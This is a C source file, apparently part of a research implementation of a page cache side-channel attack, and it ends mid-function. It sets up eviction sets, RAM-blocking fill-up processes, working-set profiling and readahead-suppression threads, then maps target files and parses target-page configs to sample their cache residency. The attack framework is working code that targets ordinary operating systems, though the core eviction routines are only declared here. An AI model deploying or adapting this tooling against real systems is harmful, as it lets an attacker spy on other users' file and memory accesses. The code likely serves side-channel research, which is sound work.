#include "fca.h"

#include <ctype.h>
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef __linux
#include <assert.h>
#include <fcntl.h>
#include <fts.h>
#include <limits.h>
#include <linux/limits.h>
#include <memory.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>
#include <wait.h>
#include <zconf.h>
#elif defined(__WIN32)
#include "windows.h"
#endif
#include "tsc_bench.h"
// NOTE uncomment this to enable debug outputs
//#define _DEBUG_
#include "debug.h"

/*-----------------------------------------------------------------------------
 * DEFINES
 */
#define MAX(a, b) (((a) >= (b)) ? a : b)
#define MIN(a, b) (((a) <= (b)) ? a : b)

/*-----------------------------------------------------------------------------
 * DEFINES
 */
// output TAGS with ANSI colors
#define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
#define INFO "\x1b[34;1m[INFO]\x1b[0m "
#define EVENT "\x1b[33;1m[EVENT]\x1b[0m "
#define OK "\x1b[32;1m[OK]\x1b[0m "
#define FAIL "\x1b[31;1m[FAIL]\x1b[0m "
#define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
#define WARNING "\x1b[33;1m[WARNING]\x1b[0m "

#define ES_TAG "[ES] "
#define BS_TAG "[BS] "
#define WS_TAG "[WS] "
#define SS_TAG "[SS] "
#define WORKER_TAG "[WORKER %lx] "

/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static size_t PAGE_SIZE = 0;
static size_t TOTAL_MEMORY_BYTES = 0;

static int eviction_running = 0;
#ifdef _WIN32
static char attack_exec_path[OSAL_MAX_PATH_LEN] = {0};
#endif

/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */
static void initTargetFile(TargetFile *target_file, int type);
static int closeTargetFile(void *arg);
static int closeTargetFileTargetsOnly(void *arg);
static void initFillUpProcess(FillUpProcess *fp);
static int closeFillUpProcess(void *arg);
static void initCachedFile(CachedFile *cached_file);
static int closeCachedFile(void *arg);
static int closeCachedFileResidentPageSequencesOnly(void *arg);
static int initAttackEvictionSet(AttackEvictionSet *es);
static int closeAttackEvictionSet(AttackEvictionSet *es);
static void initPageAccessThreadESData(PageAccessThreadESData *ps_access_thread_es_data);
static int closePageAccessThreadESData(void *arg);
static int initAttackBlockingSet(AttackBlockingSet *bs);
static int closeAttackBlockingSet(AttackBlockingSet *bs);
static int initAttackWorkingSet(AttackWorkingSet *ws);
static int closeAttackWorkingSet(AttackWorkingSet *ws);
static void initPageAccessThreadWSData(PageAccessThreadWSData *ps_access_thread_ws_data);
static int closePageAccessThreadWSData(void *arg);
static int initAttackSuppressSet(AttackSuppressSet *ss);
static int closeAttackSuppressSet(AttackSuppressSet *ss);
//static void initPageAccessThreadSSData(PageAccessThreadSSData *ps_access_thread_ss_data);
static int closePageAccessThreadSSData(void *arg);
static int initAttack(Attack *attack);
static void freeAttack(Attack *attack);

static int targetsHmCacheStatusCB(void *data, void *arg);
static int targetsEvicted(void *arg);
static int targetsHmShouldEvictCB(void *data, void *arg);
static int targetsSampleShouldEvict(Attack *attack);

static int createEvictionSet(Attack *attack);
static ssize_t evictTargets(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr);
static ssize_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr);
static ssize_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr);
static int spawnESThreads(Attack *attack);
static int targetsEvictedEsThreadsFn(void *arg);
static void *pageAccessThreadES(void *arg);
static ssize_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr,
                              size_t access_offset, size_t access_len);

static void *bsManagerThread(void *arg);
static size_t parseAvailableMem(AttackBlockingSet *bs);
#ifdef __linux
static ssize_t lineParseMemValue(char *line, char *tag);
#endif
static int blockRAM(AttackBlockingSet *bs, size_t fillup_size);
#ifdef _WIN32
static int blockRAMChildWindows(AttackBlockingSet *bs);
#endif
static int releaseRAMCb(void *addr, void *arg);
static void releaseRAM(AttackBlockingSet *bs, size_t release_size);

static int profileAttackWorkingSet(Attack *attack);
#ifdef _WIN32
static int profileAttackWorkingSetFolder(Attack *attack, char *folder);
#endif
static int initialProfileResidentPagesFile(Attack *attack, char *file_path);
static void targetPagesCacheStatusReadaheadTriggerPagesSet(DynArray *target_pages, FileMapping *target_file_mapping,
                                                           size_t fa_window_size_pages, uint8_t val);
static void targetPageCacheStatusReadaheadTriggerPagesSet(size_t offset, FileMapping *target_file_mapping,
                                                          size_t fa_window_size_pages, uint8_t val);
static void targetPagesCacheStatusSet(DynArray *target_pages, FileMapping *target_file_mapping, uint8_t val);
static void targetSequenceCacheStatusReadaheadTriggerPagesSet(PageSequence *target_sequence, FileMapping *target_file_mapping,
                                                              size_t fa_window_size_pages, uint8_t val);
static void targetPageCacheStatusReadaheadTriggerPagesBackSet(size_t offset, FileMapping *target_file_mapping,
                                                              size_t fa_window_size_pages, uint8_t val);
static void targetPageCacheStatusReadaheadTriggerPagesFrontSet(size_t offset, FileMapping *target_file_mapping,
                                                               size_t fa_window_size_pages, uint8_t val);
static void targetSequenceCacheStatusSet(PageSequence *target_sequence, FileMapping *target_file_mapping, uint8_t val);
static int cachedFileProfileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold);
static ssize_t fileMappingProfileResidentPageSequences(FileMapping *mapping, size_t ps_add_threshold,
                                                       DynArray *resident_page_sequences);
static size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, Attack *attack);
static void *wsManagerThread(void *arg);
static void *pageAccessThreadWS(void *arg);
static int reevaluateWorkingSet(Attack *attack);
static int reevaluateWorkingSetList(List *cached_file_list, Attack *attack, size_t inactive_list_set);

static int prepareSuppressSet(Attack *attack);
static int targetsHmPrepareSuppressSet(void *data, void *arg);
static int spawnSuppressThreads(Attack *attack);
static void activateSS(DynArray *suppress_set, int use_file_api);
static void *suppressThread(void *arg);

static void fileMappingActivate(FileMapping *mapping, size_t offset, int use_file_api);
static void fileMappingReactivate(FileMapping *mapping, size_t offset);


/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR CUSTOM DATATYPES
 */
void initTargetFile(TargetFile *target_file, int type)
{
    memset(target_file, 0, sizeof(TargetFile));
    initFileMapping(&target_file->mapping_);
    if (type == FCA_TARGET_TYPE_PAGES)
    {
        // can not fail, initial size is 0
        dynArrayInit(&target_file->target_pages_, sizeof(TargetPage), 0);
        target_file->has_target_pages_ = 1;
    }
    else if (type == FCA_TARGET_TYPE_PAGE_SEQUENCE)
    {
        target_file->has_target_sequence_ = 1;
    }
    else if (type == FCA_TARGET_TYPE_PAGE_SEQUENCES)
    {
        // can not fail, initial size is 0
        dynArrayInit(&target_file->target_sequences_, sizeof(PageSequence), 0);
        target_file->has_target_sequences_ = 1;
    }
    else
    {
        target_file->is_target_file_ = 1;
    }
}

int closeTargetFile(void *arg)
{
    TargetFile *target_file = arg;
    closeFileMapping(&target_file->mapping_);
    closeTargetFileTargetsOnly(target_file);
    free(target_file->file_path_abs_);
    free(target_file->last_sample_fc_status_);
    return 0;
}

int closeTargetFileTargetsOnly(void *arg)
{
    TargetFile *target_file = arg;
    if (target_file->has_target_pages_)
    {
        dynArrayDestroy(&target_file->target_pages_, NULL);
    }
    else if (target_file->has_target_sequences_)
    {
        dynArrayDestroy(&target_file->target_sequences_, NULL);
    }
    return 0;
}

void initFillUpProcess(FillUpProcess *fp)
{
    memset(fp, 0, sizeof(FillUpProcess));
    fp->pid_ = OSAL_PID_INVALID;
}

int closeFillUpProcess(void *arg)
{
    FillUpProcess *fp = arg;

    if (fp->pid_ != OSAL_PID_INVALID)
    {
        osal_process_kill(fp->pid_);
    }
    fp->pid_ = OSAL_PID_INVALID;
    return 0;
}

void initCachedFile(CachedFile *cached_file)
{
    memset(cached_file, 0, sizeof(CachedFile));
    initFileMapping(&cached_file->mapping_);
    // do not waste memory at initialization
    // can not fail because no memory is reserved
    dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), 0);
}

int closeCachedFile(void *arg)
{
    CachedFile *cached_file = arg;

    closeFileMapping(&cached_file->mapping_);
    closeCachedFileResidentPageSequencesOnly(cached_file);
    return 0;
}

int closeCachedFileResidentPageSequencesOnly(void *arg)
{
    CachedFile *cached_file = arg;

    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);

    return 0;
}

int initAttackEvictionSet(AttackEvictionSet *es)
{
    memset(es, 0, sizeof(AttackEvictionSet));
    initFileMapping(&es->mapping_);

    // only used if access threads are used
    if (sem_init(&es->worker_start_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if (sem_init(&es->worker_join_sem_, 0, 0) != 0)
    {
        return -1;
    }
    // can not fail if no space is reserved
    dynArrayInit(&es->access_threads_, sizeof(PageAccessThreadESData), 0);
    if(pthread_mutex_init(&es->workers_targets_check_lock_, NULL) != 0)
    {
        return -1;
    }

    return 0;
}

int closeAttackEvictionSet(AttackEvictionSet *es)
{
    // only used if access threads are used
    pthread_mutex_destroy(&es->workers_targets_check_lock_);
    // close worker threads
    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
    sem_destroy(&es->worker_start_sem_);
    sem_destroy(&es->worker_join_sem_);
    
    closeFileMapping(&es->mapping_);
    if (es->eviction_file_path_abs_ != NULL)
    {
        free(es->eviction_file_path_abs_);
        es->eviction_file_path_abs_ = NULL;
    }

    return 0;
}

void initPageAccessThreadESData(PageAccessThreadESData *page_access_thread_es_data)
{
    memset(page_access_thread_es_data, 0, sizeof(PageAccessThreadESData));
}

int closePageAccessThreadESData(void *arg)
{
    PageAccessThreadESData *page_access_thread_es_data = arg;
    if (page_access_thread_es_data->running_)
    {
        __atomic_store_n(&page_access_thread_es_data->running_, 0, __ATOMIC_RELAXED);
        // ensures thread stops when currently inside sem_wait
        pthread_cancel(page_access_thread_es_data->tid_);
        pthread_join(page_access_thread_es_data->tid_, NULL);
    }

    return 0;
}

int initAttackBlockingSet(AttackBlockingSet *bs)
{
    memset(bs, 0, sizeof(AttackBlockingSet));
    if (!dynArrayInit(&bs->fillup_processes_, sizeof(FillUpProcess), FCA_ARRAY_INIT_CAP))
    {
        return -1;
    }
    if (sem_init(&bs->initialized_sem_, 0, 0) != 0)
    {
        return -1;
    }

    return 0;
}

int closeAttackBlockingSet(AttackBlockingSet *bs)
{
    if(bs->running_)
    {
        __atomic_store_n(&bs->running_, 0, __ATOMIC_RELAXED);
        // could hang somewhere
        pthread_cancel(bs->manager_thread_);
        pthread_join(bs->manager_thread_, NULL);
    }

    // stop fillup processes
    dynArrayDestroy(&bs->fillup_processes_, closeFillUpProcess);
    sem_destroy(&bs->initialized_sem_);

    return 0;
}

int initAttackWorkingSet(AttackWorkingSet *ws)
{
    memset(ws, 0, sizeof(AttackWorkingSet));
    if(hashMapInit(&ws->scan_added_files_set_, 1, 1023) != 0)
    {   
        return -1;
    }
    for (size_t i = 0; i < 2; i++)
    {
        listInit(&ws->resident_files_[i], sizeof(CachedFile));
        listInit(&ws->non_resident_files_[i], sizeof(CachedFile));
    }
    if (pthread_rwlock_init(&ws->ws_lists_lock_, NULL) != 0)
    {
        return -1;
    }
    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), FCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}

int closeAttackWorkingSet(AttackWorkingSet *ws)
{
    // stop worker threads
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
    if(ws->running_)
    {
        __atomic_store_n(&ws->running_, 0, __ATOMIC_RELAXED);
        // could hang somewhere
        pthread_cancel(ws->manager_thread_);
        pthread_join(ws->manager_thread_, NULL);
    }

    // only closeCachedFile from active list
    // other ones are basically just copy with old resident pages list
    listDestroy(&ws->resident_files_[ws->up_to_date_list_set_], closeCachedFile);
    listDestroy(&ws->non_resident_files_[ws->up_to_date_list_set_], closeCachedFile);
    // just free resident pages list
    listDestroy(&ws->resident_files_[ws->up_to_date_list_set_ ^ 1], closeCachedFileResidentPageSequencesOnly);
    listDestroy(&ws->non_resident_files_[ws->up_to_date_list_set_ ^ 1], closeCachedFileResidentPageSequencesOnly);
    pthread_rwlock_destroy(&ws->ws_lists_lock_);
    hashMapDestroy(&ws->scan_added_files_set_, NULL);

    return 0;
}

void initPageAccessThreadWSData(PageAccessThreadWSData *page_access_thread_ws_data)
{
    memset(page_access_thread_ws_data, 0, sizeof(PageAccessThreadWSData));
}

int closePageAccessThreadWSData(void *arg)
{
    PageAccessThreadWSData *page_access_thread_ws_data = arg;

    if (page_access_thread_ws_data->running_)
    {
        __atomic_store_n(&page_access_thread_ws_data->running_, 0, __ATOMIC_RELAXED);
        pthread_cancel(page_access_thread_ws_data->tid_);
        pthread_join(page_access_thread_ws_data->tid_, NULL);
    }

    return 0;
}

int initAttackSuppressSet(AttackSuppressSet *ss)
{
    memset(ss, 0, sizeof(AttackSuppressSet));
    if (!dynArrayInit(&ss->suppress_set_, sizeof(TargetFile), FCA_ARRAY_INIT_CAP))
    {
        return -1;
    }
    if (!dynArrayInit(&ss->access_threads_, sizeof(PageAccessThreadSSData), FCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}

int closeAttackSuppressSet(AttackSuppressSet *ss)
{
    // stop worker threads
    dynArrayDestroy(&ss->access_threads_, closePageAccessThreadSSData);
    dynArrayDestroy(&ss->suppress_set_, closeTargetFileTargetsOnly);

    return 0;
}

void initPageAccessThreadSSData(PageAccessThreadSSData *page_access_thread_ss_data)
{
    memset(page_access_thread_ss_data, 0, sizeof(PageAccessThreadSSData));
}

int closePageAccessThreadSSData(void *arg)
{
    PageAccessThreadSSData *page_access_thread_ss_data = arg;

    if (page_access_thread_ss_data->running_)
    {
        __atomic_store_n(&page_access_thread_ss_data->running_, 0, __ATOMIC_RELAXED);
        pthread_join(page_access_thread_ss_data->tid_, NULL);
    }

    return 0;
}

int initAttack(Attack *attack)
{
    memset(attack, 0, sizeof(Attack));

    if (initAttackEvictionSet(&attack->eviction_set_) != 0)
    {
        return -1;
    }

    if (initAttackBlockingSet(&attack->blocking_set_) != 0)
    {
        return -1;
    }

    if (initAttackWorkingSet(&attack->working_set_) != 0)
    {
        return -1;
    }

    if (initAttackSuppressSet(&attack->suppress_set_) != 0)
    {
        return -1;
    }

    // 1023 prime to achieve good distribution with simple hash
    if (hashMapInit(&attack->targets_, sizeof(TargetFile), 1023) != 0)
    {
        return -1;
    }

    return 0;
}

void freeAttack(Attack *attack)
{
    // in reverse close remaining files, unmap and free memory
    closeAttackSuppressSet(&attack->suppress_set_);
    hashMapDestroy(&attack->targets_, closeTargetFile);
    closeAttackWorkingSet(&attack->working_set_);
    closeAttackBlockingSet(&attack->blocking_set_);
    closeAttackEvictionSet(&attack->eviction_set_);
}

void joinThread(void *arg)
{
    pthread_t *thread = arg;

    pthread_join(*thread, NULL);
}

/*-----------------------------------------------------------------------------
 * PUBLIC ATTACK FUNCTIONS
 */

int fcaInit(Attack *attack)
{
    int ret = 0;

    // get system page size
    PAGE_SIZE = osal_get_page_size();
    if(PAGE_SIZE == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at osal_get_page_size...\n", OSAL_EC));
        goto error;
    }

    // get system ram size
#ifdef __linux
    struct sysinfo system_info;
    ret = sysinfo(&system_info);
    if (ret != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at sysinfo...\n", OSAL_EC));
        goto error;
    }
    TOTAL_MEMORY_BYTES = system_info.totalram + system_info.totalswap;
#elif defined _WIN32
    GlobalMemoryStatusEx memory_status;
    if (!GlobalMemoryStatusEx(&memory_status))
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at GlobalMemoryStatusEx...\n", OSAL_EC));
        goto error;
    }
    TOTAL_MEMORY_BYTES = memory_status.ullTotalPhys + memory_status.ullTotalPageFile;
#endif

    // initialise attack structures
    if (initAttack(attack) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at initAttack...\n", OSAL_EC));
        goto error;
    }

    DEBUG_PRINT((DEBUG INFO "Page size: %zu\tTotal memory: %zu\n", PAGE_SIZE, TOTAL_MEMORY_BYTES));
    return 0;
error:
    freeAttack(attack);
    return -1;
}

/* TODO Windows
*
* Increase working set to hold maximal amount of evicton files
* WS, SS should be in new processes (like BS but more complicated)
* Init function with flags for spawning supprocesses
*/
int fcaStart(Attack *attack, int flags)
{
    int ret = 0;

    // only windows
    // special handling of blocking, working and suppress set
#ifdef _WIN32
    if (flags & FCA_START_WIN_SPAWN_BS_CHILD)
    {
        if (blockRAMChildWindows() != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at blockRAMChildWindows...\n", OSAL_EC));
            return -1;
        }
    }
    else if (flags & FCA_START_WIN_SPAWN_WS_CHILD)
    {
    }
    else if (flags & FCA_START_WIN_SPAWN_SS_CHILD)
    {
    }
#endif
    // needed for accurate time measurments
    if (tsc_bench_init(0) != 0) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at tsc_bench_init...\n", OSAL_EC));
        goto error;   
    }

    // change file cache state sample function
    // must be done here so that it is effective before profiling working set
    if (changeFcStateSource(attack->fc_state_source_) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at changeFcStateSource...\n", OSAL_EC));
        goto error;
    }

    // create + map attack eviction set
    DEBUG_PRINT((DEBUG ES_TAG INFO "Trying to create a %zu MB eviction set.\nThis might take a while...\n",
                 TOTAL_MEMORY_BYTES / 1024 / 1024));
    ret = createEvictionSet(attack);
    if (ret != 0)
    {
        DEBUG_PRINT((DEBUG ES_TAG FAIL "Error " OSAL_EC_FS " at createEvictionSet...\n", OSAL_EC));
        goto error;
    }
    DEBUG_PRINT((DEBUG ES_TAG OK "Trying to create a %zu MB eviction set.\n",
                 TOTAL_MEMORY_BYTES / 1024 / 1024));
    // if wanted spawn eviction threads
    if (attack->eviction_set_.use_access_threads_)
    {
        DEBUG_PRINT((DEBUG ES_TAG INFO "Spawning eviction threads...\n"));
        if (spawnESThreads(attack) != 0)
        {
            DEBUG_PRINT((DEBUG ES_TAG FAIL "Error " OSAL_EC_FS " at spawnESThreads...\n", OSAL_EC));
            goto error;
        }
        DEBUG_PRINT((DEBUG ES_TAG OK "Spawning eviction threads...\n"));
    }

    // profile initial working set before blocking memory
    if (attack->use_attack_ws_)
    {
        DEBUG_PRINT((DEBUG WS_TAG INFO "Profiling working set...\n"));
        if (profileAttackWorkingSet(attack) != 0)
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at profileAttackWorkingSet...\n", OSAL_EC));
            goto error;
        }
        DEBUG_PRINT((DEBUG WS_TAG OK "Profiling working set...\n"));

        DEBUG_PRINT((DEBUG WS_TAG INFO "Initial working set consists of %zu files (%zu bytes mapped).\n",
                attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_,
                attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_]));
    }

    // start manager thread for blocking set
    if (attack->use_attack_bs_)
    {
        DEBUG_PRINT((DEBUG BS_TAG INFO "Spawning blocking set manager thread...\n"));
        attack->blocking_set_.running_ = 1;
        if (pthread_create(&attack->blocking_set_.manager_thread_, NULL, bsManagerThread, attack) != 0)
        {
            attack->blocking_set_.running_ = 0;
            DEBUG_PRINT((DEBUG BS_TAG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
            goto error;
        }
        else
        {
            // wait till blocking set is initialized
            sem_wait(&attack->blocking_set_.initialized_sem_);
        }
        DEBUG_PRINT((DEBUG BS_TAG OK "Spawning blocking set manager thread...\n"));
    }

    // reevaluate working set after blocking memory
    if (attack->use_attack_bs_ && attack->use_attack_ws_)
    {
        // wait a bit until ws is reestablished
        osal_sleep_us(3000000);
        
        DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluating working set...\n"));
        if (reevaluateWorkingSet(attack) != 0)
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at reevaluateWorkingSet...\n", OSAL_EC));
            goto error;
        }
        attack->working_set_.up_to_date_list_set_ ^= 1;
        DEBUG_PRINT((DEBUG WS_TAG OK "Reevaluating working set...\n"));
        DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluated working set consists of %zu files (%zu bytes mapped).\n",
                attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_,
                attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_]));

        /*unsigned char choice = 0;
        while(choice != 'q')
        {
            printf("> ");
            choice = getchar();
            if(choice == 'r') 
            {
                if(reevaluateWorkingSet(attack) != 0) 
                {          
                    DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at reevaluateWorkingSet...\n", OSAL_EC));
                    goto error;  
                }
                attack->working_set_.up_to_date_list_set_ ^= 1;
                printf(INFO "Reevaluated working set now consists of %zu files (%zu bytes mapped).\n",
                            attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_,
                            attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_]);
            }
            else if(choice == 'a') 
            {
                activateWS(attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].head_, attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_, attack);
            }
        }*/

        // start ws manager thread
        DEBUG_PRINT((DEBUG WS_TAG INFO "Spawning working set manager thread...\n"));
        attack->working_set_.running_ = 1;
        if (pthread_create(&attack->working_set_.manager_thread_, NULL, wsManagerThread, attack) != 0)
        {
            attack->working_set_.running_ = 0;
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
        }
        DEBUG_PRINT((DEBUG WS_TAG OK "Spawning working set manager thread...\n"));
    }

    // if wanted spawn readahead suppress threads
    if (attack->use_attack_ss_)
    {
        DEBUG_PRINT((DEBUG SS_TAG INFO "Preparing suppress set...\n"));
        // prepare suppress set
        if (prepareSuppressSet(attack) != 0)
        {
            DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at prepareSuppressSet...\n", OSAL_EC));
            return -1;
        }
        DEBUG_PRINT((DEBUG SS_TAG OK "Preparing suppress set...\n"));

        DEBUG_PRINT((DEBUG SS_TAG INFO "Spawning suppress threads...\n"));
        if (spawnSuppressThreads(attack) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at spawnSuppressThreads...\n", OSAL_EC));
            goto error;
        }
        DEBUG_PRINT((DEBUG SS_TAG OK "Spawning suppress threads...\n"));

        // suppress set might trigger the caching of the target initially, evict if so
        activateSS(&attack->suppress_set_.suppress_set_, attack->suppress_set_.use_file_api_);
        if(fcaTargetsSampleFlushOnce(attack) == -1)
        {
            DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at fcaTargetsSampleFlushOnce...\n", OSAL_EC));
            goto error;   
        }
    }

#ifdef _WIN32
    if (GetModuleFileNameA(NULL, attack_exec_path, OSAL_MAX_PATH_LEN) == 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at GetModuleFileNameA...\n", OSAL_EC));
        goto error;
    }
#endif

    return 0;

error:
    fcaExit(attack);
    return -1;
}

TargetFile *fcaAddTargetFile(Attack *attack, char *target_file_path)
{
    char target_file_path_abs[OSAL_MAX_PATH_LEN];
    TargetFile target_file;
    TargetFile *target_file_ptr = NULL;

    // get absolute path
    if (osal_fullpath(target_file_path, target_file_path_abs) == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at osal_fullpath...\n", OSAL_EC));
        return NULL;
    }

    initTargetFile(&target_file, FCA_TARGET_TYPE_FILE);
    // save absolute target file path
    target_file.file_path_abs_ = strdup(target_file_path_abs);
    if(target_file.file_path_abs_ == NULL) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at strdup...\n", OSAL_EC));
        goto error;
    }

    // map target file and add to hash map
    if (mapFile(&target_file.mapping_, target_file_path_abs, FILE_ACCESS_READ | FILE_NOATIME,
                MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapFile...\n", OSAL_EC));
        goto error;
    }
    // copy of file status for sampling
    target_file.last_sample_fc_status_ = malloc(target_file.mapping_.size_pages_ * sizeof(uint8_t));
    if(target_file.last_sample_fc_status_ == NULL) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at malloc...\n", OSAL_EC));
        goto error;     
    }

    // advise random access to avoid readahead (we dont want to change the working set)
    // if it does not work ignore
    if (adviseFileUsage(&target_file.mapping_, 0, 0, USAGE_RANDOM) != 0)
    {
        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
    }
    target_file_ptr = hashMapInsert(&attack->targets_, target_file_path_abs, strlen(target_file_path_abs),
                                    &target_file);
    if (target_file_ptr == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at hashMapInsert...\n", OSAL_EC));
        goto error;
    }

    return target_file_ptr;

error:
    closeTargetFile(&target_file);
    return NULL;
}

int fcaAddTargetsFromFile(Attack *attack, char *targets_config_file_path)
{
    int ret = 0;
    FILE *targets_config_file = NULL;
    char line_buffer[FCA_IN_LINE_MAX] = {0};
    size_t line_length = 0;
    int parse_pages = 0;
    char current_target_file_path_abs[OSAL_MAX_PATH_LEN];
    TargetFile current_target_file;

    // open targets config file
    targets_config_file = fopen(targets_config_file_path, "r");
    if (targets_config_file == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at fopen for: %s\n", OSAL_EC, targets_config_file_path));
        return -1;
    }

    // init current target file
    initTargetFile(&current_target_file, FCA_TARGET_TYPE_PAGES);
    while (1)
    {
        // read one line
        if (fgets(line_buffer, FCA_IN_LINE_MAX, targets_config_file) == NULL)
        {
            if (feof(targets_config_file))
            {
                break;
            }
            else
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at fgets for: %s\n", OSAL_EC, targets_config_file_path));
                goto error;
            }
        }
        line_length = strlen(line_buffer);

        // check for new line character (must be in array)
        // and remove it
        if (line_buffer[line_length - 1] != '\n')
        {
            DEBUG_PRINT((DEBUG FAIL "Error: Unable to read a full line (overflow?)...\n"));
            goto error;
        }
        line_buffer[--line_length] = 0;

        // empty line -> new target file
        if (line_length == 0)
        {
            // insert processed target file
            if (hashMapInsert(&attack->targets_, current_target_file_path_abs, strlen(current_target_file_path_abs),
                              &current_target_file) == NULL)
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at hashMapInsert...\n", OSAL_EC));
                goto error;
            }
            DEBUG_PRINT((DEBUG INFO "Added target file %s.\n", current_target_file_path_abs));
            // init new target file
            initTargetFile(&current_target_file, FCA_TARGET_TYPE_PAGES);
            parse_pages = 0;
            continue;
        }

        if (parse_pages)
        {
            TargetPage target_page;
            int no_eviction = 0;

            if (sscanf(line_buffer, "%lx %d", &target_page.offset_, &no_eviction) != 2)
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at sscanf...\n", OSAL_EC));
                goto error;
            }
            if (no_eviction != 0 && no_eviction != 1)
            {
                DEBUG_PRINT((DEBUG FAIL "Error: no_eviction can only be 0 or 1...\n"));
                goto error;
            }
            target_page.no_eviction_ = no_eviction;

            // check for out of bounds
            if (target_page.offset_ >= current_target_file.mapping_.size_pages_)
            {
                DEBUG_PRINT((DEBUG FAIL "Target page out of bounds (%zu >= %zu)...\n", target_page.offset_,
                             current_target_file.mapping_.size_pages_));
                goto error;
            }

            // append target page to file
            if (dynArrayAppend(&current_target_file.target_pages_, &target_page) == NULL)
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
                goto error;
            }

            DEBUG_PRINT((DEBUG INFO "Added target page %zu from file %s with no_eviction=%d\n",
                         target_page.offset_, current_target_file_path_abs, target_page.no_eviction_));
        }
        else
        {
            // get absolute path
            if (osal_fullpath(line_buffer, current_target_file_path_abs) == NULL)
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at osal_fullpath...\n", OSAL_EC));
                goto error;
            }
            // save absolute target file path
            current_target_file.file_path_abs_ = strdup(current_target_file_path_abs);
            if(current_target_file.file_path_abs_ == NULL) 
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at strdup...\n", OSAL_EC));
                goto error;
            }

            // map target file
            if (mapFile(&current_target_file.mapping_, current_target_file_path_abs, FILE_ACCESS_READ | FILE_NOATIME,
                        MAPPING_ACCESS_READ | MAPPING_SHARED) != 0)
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapFile...\n", OSAL_EC));
                goto error;
            }
            // copy of file status for sampling
            current_target_file.last_sample_fc_status_ = malloc(current_target_file.mapping_.size_pages_ * sizeof(uint8_t));
            if(current_target_file.last_sample_fc_status_ == NULL) 
            {
                DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at malloc...\n", OSAL_EC));
                goto error;     
            }

            // advise random access to avoid readahead (we dont want to change the working set)
            // if it does not work ignore
